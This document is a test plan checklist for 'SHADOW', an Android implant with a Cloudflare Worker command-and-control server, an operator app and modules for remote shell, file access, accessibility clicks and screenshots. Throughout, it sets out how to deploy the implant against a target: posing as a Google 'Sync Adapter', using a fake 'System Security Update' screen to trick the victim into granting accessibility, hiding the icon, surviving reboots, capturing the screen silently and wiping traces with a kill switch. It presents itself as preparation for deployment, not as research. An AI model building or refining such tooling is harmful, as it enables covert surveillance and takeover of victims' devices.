# SHADOW Integration Test Plan

## Prerequisites
- [ ] `Build All Modules` CI workflow passes (green)
- [ ] `Build SHADOW Implant` CI workflow passes (green)
- [ ] `Build Operator APK` CI workflow passes (green)
- [ ] Worker responds at `https://shadow-worker.marwannaili-23-07.workers.dev/modules/manifest.json`
- [ ] R2 bucket contains module `.so` files and `manifest.json`

## Phase 1: Infrastructure Verification (no device needed)

### 1.1 Worker Endpoints
- [ ] `GET /modules/manifest.json` → 200, returns `{"modules":[...]}` with built modules
- [ ] `GET /modules/arm64-v8a/shell.so` → 200, returns binary
- [ ] `POST /api/rpc` without headers → 401
- [ ] `POST /api/rpc` with valid Ed25519 sig → 200, returns `{"success":true,"cmdId":"...","sent":false}`
- [ ] `POST /api/rpc` with stale timestamp (>60s old) → 401
- [ ] `POST /api/rpc` with wrong key sig → 403

### 1.2 Module Artifacts
- [ ] Download `shell.so` from R2 → verify ELF ARM64 header: `file shell.so` shows `ELF 64-bit LSB shared object, ARM aarch64`
- [ ] All 8 modules present in R2: `a11y`, `admin`, `binder`, `crypto`, `fridge`, `fs`, `screen`, `shell`

## Phase 2: Implant Installation

### 2.1 APK Installation
- [ ] Download signed APK from GitHub Actions artifacts
- [ ] `apksigner verify --print-certs implant.apk` shows valid signature
- [ ] Install on ARM64 target device: `adb install implant.apk`
- [ ] App appears as "Sync Adapter" in app drawer

### 2.2 Social Engineering
- [ ] Launch app → "System Security Update" screen appears
- [ ] Progress bar fills → "Action Required" card appears
- [ ] Icon disappears from launcher after first open (component disabled)
- [ ] Tap "Install & Reboot" → redirects to Accessibility Settings
- [ ] "Sync Adapter" service listed → enable it
- [ ] Accessibility service activates (check `adb shell settings get secure enabled_accessibility_services`)

## Phase 3: C2 Connectivity

### 3.1 Implant → Worker
- [ ] Check Worker logs: implant WebSocket connection registered
- [ ] Verify DO `ImplantDO` created for the implant ID
- [ ] Module sync: implant downloads manifest.json from R2
- [ ] Module sync: .so files appear in `/data/data/com.google.android.syncadapters.contacts/files/modules/`
- [ ] Module load: `libshadow_shell.so` loaded via dlopen (check logcat for "Initializing module: shell")

### 3.2 Operator → Worker → Implant
- [ ] Open Operator app → connects to Worker
- [ ] Implant appears in fleet list
- [ ] Send `shell` command: `ls /sdcard`
- [ ] Shell module executes → output streams back to Operator terminal
- [ ] Send `fs` command: `ls /` → directory listing returns
- [ ] Send `a11y` command: `click com.android.settings:id/some_button` → dispatched

## Phase 4: Persistence

### 4.1 Boot Survival
- [ ] Reboot device
- [ ] Wait 60 seconds → implant reconnects to Worker
- [ ] Modules re-downloaded and loaded

### 4.2 Accessibility Survival
- [ ] Force-stop the app from Settings
- [ ] Accessibility service auto-restarts (bound by system)
- [ ] Implant reconnects within 5 minutes

## Phase 5: Stealth

### 5.1 Icon Hiding
- [ ] After first launch, icon gone from launcher
- [ ] App still accessible via `adb shell am start -n com.google.android.syncadapters.contacts/com.shadow.ui.SystemUpdateActivity`

### 5.2 Kill Switch
- [ ] Send `kill` command from Operator
- [ ] Module .so files zeroed and deleted from disk
- [ ] Config files wiped
- [ ] Process terminates
- [ ] App no longer connects to Worker

## Phase 6: Screen Capture (Android 11+)

- [ ] Send `screen` command with `{"action":"screenshot"}`
- [ ] JPEG screenshot returns to Operator (base64)
- [ ] No system prompt or notification shown on target device

## Success Criteria
ALL checkboxes in Phases 1-3 must pass for a minimum viable deployment.
Phases 4-6 can be verified incrementally post-deployment.
